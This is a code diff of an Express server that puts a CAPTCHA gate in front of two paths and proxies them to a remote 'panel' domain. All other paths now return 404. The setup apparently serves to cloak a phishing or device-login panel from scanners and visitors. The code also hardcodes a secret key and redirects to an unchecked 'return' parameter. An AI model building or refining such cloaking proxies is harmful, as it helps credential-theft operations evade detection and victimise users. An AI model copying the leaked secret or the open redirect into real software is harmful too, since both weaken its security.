@@ -6,8 +6,8 @@ const port = process.env.PORT || 3000;
 app.set('trust proxy', 1);
 
 const PANEL = 'portal42-343.sbs';
-const SITE_KEY = '0x4AAAAAAEs9a3e6xuiCWrZa';
-const SECRET_KEY = '0x4AAAAAAEs9ayeKqClMX6dKR--8FLZtOjE'; // ⚠️ REPLACE WITH YOUR ACTUAL SECRET
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
+const SECRET_KEY = '0x4AAAAAAEs9ayeKqClMX6dKR--8FLZtOjE'; // Keep this – needed for verification
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -21,7 +21,7 @@ app.get('/captcha', (req, res) => {
     res.send(getCaptchaHTML(SITE_KEY, returnPath));
 });
 
-// ---- PROTECTED ROUTES ----
+// ---- PROTECTED ROUTES - redirect to CAPTCHA ----
 app.get('/l/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
@@ -29,7 +29,7 @@ app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// ---- VERIFICATION ENDPOINT ----
+// ---- VERIFICATION ----
 app.post('/verify-captcha', async (req, res) => {
     const token = req.body['cf-turnstile-response'];
     if (!token) return res.status(400).send('Missing token');
@@ -41,16 +41,13 @@ app.post('/verify-captcha', async (req, res) => {
             body: `secret=${SECRET_KEY}&response=${token}`
         });
         const data = await verify.json();
-
         if (data.success) {
-            // Set cookie
             res.cookie('captcha_passed', 'true', {
                 maxAge: 300000,
                 httpOnly: true,
                 secure: true,
                 sameSite: 'lax'
             });
-            // Redirect to the original path
             const returnTo = req.query.return || '/';
             return res.redirect(returnTo);
         } else {
@@ -62,42 +59,50 @@ app.post('/verify-captcha', async (req, res) => {
     }
 });
 
-// ---- PROXY ----
-app.use('*', async (req, res) => {
-    const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
-    if (isProtected && !req.cookies.captcha_passed) {
+// ---- PROXY ONLY FOR /l/ AND /device/ (with cookie check) ----
+app.use('/l/*', async (req, res) => {
+    if (!req.cookies.captcha_passed) {
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
     }
-
+    // Proxy to panel
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
         headers.set('Host', PANEL);
         headers.set('User-Agent', 'Mozilla/5.0');
-        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        if (clientIp) {
-            headers.set('X-Forwarded-For', clientIp);
-            headers.set('CF-Connecting-IP', clientIp);
-        }
-        const opts = {
-            method: req.method,
-            headers: headers,
-        };
-        if (req.method !== 'GET' && req.method !== 'HEAD') {
-            opts.body = JSON.stringify(req.body);
-        }
-        const response = await fetch(target.toString(), opts);
+        const response = await fetch(target.toString(), { method: req.method, headers });
         const body = await response.text();
         res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
     } catch (e) {
-        console.error('Proxy error:', e);
         res.status(500).send('Proxy Error');
     }
 });
 
+app.use('/device/*', async (req, res) => {
+    if (!req.cookies.captcha_passed) {
+        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
+    }
+    try {
+        const target = new URL(req.originalUrl, `https://${PANEL}`);
+        const headers = new Headers(req.headers);
+        headers.set('Host', PANEL);
+        headers.set('User-Agent', 'Mozilla/5.0');
+        const response = await fetch(target.toString(), { method: req.method, headers });
+        const body = await response.text();
+        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
+    } catch (e) {
+        res.status(500).send('Proxy Error');
+    }
+});
+
+// ---- ALL OTHER PATHS (including root "/") – return 404 ----
+app.use('*', (req, res) => {
+    res.status(404).send('Not Found');
+});
+
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ---- CAPTCHA HTML with improved JavaScript ----
+// ---- CAPTCHA HTML (same as before) ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -140,27 +145,16 @@ function getCaptchaHTML(siteKey, returnPath) {
 
     function turnstileCallback(token) {
       if (token) {
-        // Redirect the browser directly to the return path, but first we need to verify.
-        // Use a simple fetch to verify, then redirect.
         fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: 'cf-turnstile-response=' + token
         }).then(response => {
-          // If the response is a redirect, follow it
-          if (response.redirected) {
-            window.location.href = response.url;
-          } else {
-            // If not redirected, try to go to the return path
-            window.location.href = returnPath;
-          }
-        }).catch(err => {
-          // If fetch fails, just go to return path
-          window.location.href = returnPath;
-        });
+          if (response.redirected) window.location.href = response.url;
+          else window.location.href = returnPath;
+        }).catch(() => { window.location.href = returnPath; });
       }
     }
-
     function turnstileErrorCallback() {
       document.getElementById('status').textContent = 'Error. Please refresh.';
       document.getElementById('status').style.display = 'block';
